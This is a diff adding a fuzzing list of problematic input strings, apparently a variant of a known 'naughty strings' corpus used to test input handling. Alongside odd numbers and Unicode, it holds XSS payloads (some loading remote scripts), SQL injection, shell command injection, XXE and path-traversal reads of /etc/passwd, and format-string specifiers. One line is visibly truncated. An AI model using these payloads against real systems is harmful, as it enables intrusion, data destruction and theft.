@@ -1,0 +1,197 @@
+
+undefined
+undef
+null
+NULL
+(null)
+nil
+NIL
+true
+false
+True
+False
+TRUE
+FALSE
+None
+hasOwnProperty
+then
+constructor
+\
+\\
+#
+0
+1.00
+$1.00
+1/2
+1E2
+1E02
+1E+02
+-1
+-1.00
+-1E02
+-1E+02
+1/0
+0/0
+-2147483648/-1
+-9223372036854775808/-1
+-0
+-0.0
++0
++0.0
+0.00
+0..0
+.
+0.0.0
+0,00
+0,,0
+,
+0,0,0
+0.0/0
+1.0/0.0
+0.0/0.0
+1,0/0,0
+0,0/0,0
+--1
+-
+-.
+-,
+999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
+NaN
+Infinity
+-Infinity
+INF
+1#INF
+-1#IND
+1#QNAN
+1#SNAN
+1#IND
+0x0
+0xffffffff
+0xffffffffffffffff
+0xabad1dea
+123456789012345678901234567890123456789
+1,000.00
+1 000.00
+1'000.00
+1,000,000.00
+1'000'000.00
+01000
+08
+09
+2.2250738585072011e-308
+#
+,./;'[]\-=
+<>?:"{}|_+
+!@#$%^&*()`~
+<foo val=“bar” />
+１２３
+𝚃𝚑𝚎 𝚚𝚞𝚒𝚌𝚔 𝚋𝚛𝚘𝚠𝚗 𝚏𝚘𝚡 𝚓𝚞𝚖𝚙𝚜 𝚘𝚟𝚎𝚛 𝚝𝚑𝚎 𝚕𝚊𝚣𝚢 𝚍𝚘𝚐
+⒯⒣⒠ ⒬⒰⒤⒞⒦ ⒝⒭⒪⒲⒩ ⒡⒪⒳ ⒥⒰⒨⒫⒮ ⒪⒱⒠⒭ ⒯⒣⒠ ⒧⒜⒵⒴ ⒟⒪⒢
+<script>alert(123)</script>
+&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;
+<img src=x onerror=alert(123) />
+<svg><script>123<1>alert(123)</script>
+"><script>alert(123)</script>
+'><script>alert(123)</script>
+><script>alert(123)</script>
+</script><script>alert(123)</script>
+< / script >< script >alert(123)< / script >
+onfocus=JaVaSCript:alert(123) autofocus
+' onfocus=JaVaSCript:alert(123) autofocus
+＜script＞alert(123)＜/script＞
+<sc<script>ript>alert(123)</sc</script>ript>
+--><script>alert(123)</script>
+";alert(123);t="
+';alert(123);t='
+JavaSCript:alert(123)
+;alert(123);
+src=JaVaSCript:prompt(132)
+"><script>alert(123);</script x="
+'><script>alert(123);</script x='
+><script>alert(123);</script x=
+" autofocus onkeyup="javascript:alert(123)
+' autofocus onkeyup='javascript:alert(123)
+<script\x20type="text/javascript">javascript:alert(1);</script>
+<script\x3Etype="text/javascript">javascript:alert(1);</script>
+'`"><\x3Cscript>javascript:alert(1)</script>
+'`"><\x00script>javascript:alert(1)</script>
+ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
+<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a hr
+<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
+`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
+"`'><script>\x0Cjavascript:alert(1)</script>
+"`'><script>\x7Ejavascript:alert(1)</script>
+"`'><script>\xE2\x80\x87javascript:alert(1)</script>
+<img \x47src=x onerror="javascript:alert(1)">
+<img \x11src=x onerror="javascript:alert(1)">
+<img src=x\x12onerror="javascript:alert(1)">
+<img src=x\x13onerror="javascript:alert(1)">
+<img src=x onerror=\x10"javascript:alert(1)">
+<img src=x onerror=\x11"javascript:alert(1)">
+<IMG onmouseover="alert('xxs')">
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC="jav   ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<plaintext>
+http://a/%%30%30
+</textarea><script>alert(123)</script>
+1;DROP TABLE users
+1'; DROP TABLE users-- 1
+' OR 1=1 -- 1
+' OR '1'='1
+%
+_
+-
+--
+--version
+$USER
+/dev/null; touch /tmp/blns.fail ; echo
+`touch /tmp/blns.fail`
+$(touch /tmp/blns.fail)
+eval("puts 'hello world'")
+System("ls -al /")
+`ls -al /`
+Kernel.exec("ls -al /")
+Kernel.exit(1)
+%x('ls -al /')
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+$HOME
+$ENV{'HOME'}
+%d
+%s%s%s%s%s
+{0}
+%*.*s
+%@
+%n
+File:///
+../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../etc/hosts
+<<< %s(un='%s') = %u
++++ATH0
+CON
+PRN
+AUX
+CLOCK$
+NUL
+A:
+ZZ:
+COM1
+LPT1
+LPT2
+LPT3
+COM2
+COM3
+COM4
